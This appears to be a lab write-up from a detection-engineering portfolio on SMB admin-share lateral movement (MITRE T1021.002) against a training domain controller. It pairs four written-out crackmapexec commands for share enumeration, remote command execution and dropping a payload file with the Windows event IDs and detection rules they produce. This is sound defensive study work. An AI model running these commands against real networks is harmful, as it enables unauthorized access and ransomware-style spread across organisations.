# T1021.002 — SMB / Windows Admin Shares (Lateral Movement)

**Tactic:** Lateral Movement  
**MITRE Link:** https://attack.mitre.org/techniques/T1021/002/  
**Status:** ✅ Complete

---

## Why Attackers Use This

After obtaining credentials (often via LSASS dump — T1003.001), attackers use SMB to move laterally across the network using built-in Windows admin shares:

- `C$` — Default administrative share for C: drive
- `ADMIN$` — Maps to `C:\Windows\`
- `IPC$` — Inter-process communication share

**Why it's effective:**
- SMB is a legitimate Windows protocol — traffic blends with normal business activity
- Admin shares exist on every Windows machine by default
- Tools like `crackmapexec`, `impacket-psexec`, and `PsExec` automate access
- Credentials obtained from LSASS (previous technique) work directly here
- Remote command execution possible without deploying additional malware

**Real-world threat groups:** Conti, LockBit, APT1, FIN6, Cobalt Strike operators — SMB lateral movement is present in virtually every enterprise ransomware incident.

---

## Attack Scenario

Simulating a threat actor who used credentials obtained from LSASS (T1003.001) to authenticate to a domain controller via SMB, enumerate shares, execute remote commands, and drop a payload file — completing the lateral movement phase of the kill chain.

**Attacker machine:** Linux (10.145.105.116)  
**Target machine:** THM-SOC-DC01 (10.145.165.32) — Windows Domain Controller  
**Credentials used:** THM\THM-Analyst  
**Domain:** THM

---

## Attack Commands Executed

```bash
# Step 1 — Enumerate SMB shares on target
crackmapexec smb 10.145.165.32 -u THM-Analyst -p <password> --shares

# Step 2 — Execute remote command (confirms lateral movement)
crackmapexec smb 10.145.165.32 -u THM-Analyst -p <password> -x "whoami"

# Step 3 — Execute second command (network recon on target)
crackmapexec smb 10.145.165.32 -u THM-Analyst -p <password> -x "ipconfig"

# Step 4 — Drop payload to C$ (simulates implant staging)
crackmapexec smb 10.145.165.32 -u THM-Analyst -p <password> --put-file /tmp/payload.txt '\Users\Public\payload.txt'
```

**Results:**
- `[+] Pwn3d!` — Administrator-level SMB access confirmed
- `thm\thm-analyst` — Remote whoami execution successful
- `payload.txt` — File successfully written to `C:\Users\Public\` on target

---

## Logs Generated

See [logs-observed.md](./logs-observed.md) for full lab evidence.

| Log Source | Event ID | Description | Captured |
|------------|----------|-------------|----------|
| Windows Security | **4624** | Network logon — Logon Type 3 from attacker IP | ✅ |
| Windows Security | **5140** | Network share object accessed — `\\*\C$` | ✅ |
| Windows Security | 4648 | Explicit credential logon | ⏳ Check if present |
| Sysmon | 3 | Network connection to SMB port 445 | ⏳ Sysmon config dependent |

---

## Detection

- **Sigma Rule:** [sigma-rule.yml](./sigma-rule.yml)
- **Splunk SPL:** [splunk-spl.txt](./splunk-spl.txt)
- **Tuning Notes:** [tuning-notes.md](./tuning-notes.md)

---

## Screenshots

See [screenshots/](./screenshots/) for lab evidence.
